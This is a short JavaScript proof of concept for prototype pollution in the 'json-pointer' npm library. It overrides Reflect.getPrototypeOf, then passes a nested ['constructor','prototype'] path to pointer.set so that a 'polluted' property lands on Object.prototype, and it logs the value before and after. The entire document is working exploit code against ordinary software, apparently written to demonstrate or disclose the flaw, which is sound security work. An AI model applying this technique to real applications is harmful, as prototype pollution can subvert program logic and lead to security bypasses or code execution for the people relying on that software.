Reflect.getPrototypeOf = () => false;
const pointer = require('json-pointer');
let obj = {};
console.log({}.polluted);
pointer.set({}, [
    [
        'constructor',
        'prototype'
    ],
    'polluted'
], 'yes');
console.log({}.polluted);